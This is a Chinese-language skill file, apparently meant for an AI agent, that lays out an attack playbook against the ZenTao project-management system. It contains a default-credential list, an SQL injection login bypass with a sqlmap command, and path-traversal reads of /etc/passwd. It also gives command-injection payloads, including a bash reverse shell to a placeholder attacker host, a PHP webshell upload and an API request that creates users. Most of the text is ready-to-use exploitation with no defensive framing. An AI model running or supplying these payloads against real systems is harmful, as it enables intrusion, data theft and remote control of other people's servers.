---
name: 禅道oa攻击
description: Use when encountering 禅道项目管理oa漏洞利用 - sql注入、文件上传、rce
---

# 禅道OA攻击

## Info

- **Domain**: oa
- **Tags**: oa, zentao, enterprise, rce

## 攻击思路
```
系统识别 → 版本枚举 → 漏洞探测 → SQL注入/RCE → 权限提升
```

## 系统识别

| 特征 | 值 |
|------|-----|
| Title | 禅道 |
| 路径 | /zentao/, /pms/, /pro/, /max/ |
| Cookie | lang=zh-cn |

```bash
# 版本识别
curl http://target/zentao/
grep -oP "version.*?[\d.]+"
```

## 版本与路径

| 版本 | 路径前缀 |
|------|----------|
| 开源版 | /zentao/ |
| 企业版 | /pro/ |
| 旗舰版 | /max/ |

## 漏洞矩阵

| CVE | 漏洞类型 | 版本 | 利用难度 |
|-----|----------|------|----------|
| CVE-2022-0770 | SQL注入 | 全版本 | 低 |
| CVE-2022-23046 | RCE | < 16.5 | 中 |
| CVE-2021-46416 | 任意文件读取 | < 16.0 | 低 |

## SQL注入攻击

### CVE-2022-0770
```bash
# 注入点: /zentao/user-login.html
POST /zentao/user-login.html
account=admin'+or+1=1--+-&password=123456

# sqlmap利用
sqlmap -u "http://target/zentao/user-login.html" \
  --data="account=admin&password=123" \
  --dbms=mysql --batch
```

## 文件读取攻击

```bash
# CVE-2021-46416 任意文件读取
GET /zentao/file-read.html?fileID=../../../../../../../etc/passwd

# Windows
GET /zentao/file-read.html?fileID=../../../../../../../windows/win.ini
```

## RCE攻击

### CVE-2022-23046
```bash
# 注入点: /zentao/repo-edit.html
POST /zentao/repo-edit.html
Content-Type: application/x-www-form-urlencoded

SCM=Subversion&client=;id;

# 或使用管道
client=/usr/bin/svn|id

# 反弹Shell
client=;bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'
```

## 文件上传攻击

```bash
# 上传点: /zentao/file-upload.html
POST /zentao/file-upload.html
Content-Type: multipart/form-data

# 上传PHP WebShell
Content-Disposition: form-data; name="file"; filename="shell.php"
<?php system($_GET['c']);?>
```

## API利用

```bash
# 获取Token
POST /zentao/api.php?m=user&f=login
account=admin&password=admin

# 使用Token
GET /zentao/api.php?m=bug&f=browse&token=TOKEN

# 创建用户
POST /zentao/api.php?m=user&f=create&token=TOKEN
```

## 默认凭证

| 账户 | 密码 |
|------|------|
| admin | 123456 |
| dev | dev |
| pm | pm |
| po | po |

## 攻击链

```
1. 访问/zentao/识别版本
2. 尝试默认凭证登录
3. 检测SQL注入漏洞
4. 利用文件读取获取配置
5. RCE获取Shell
6. 提权/横向移动
```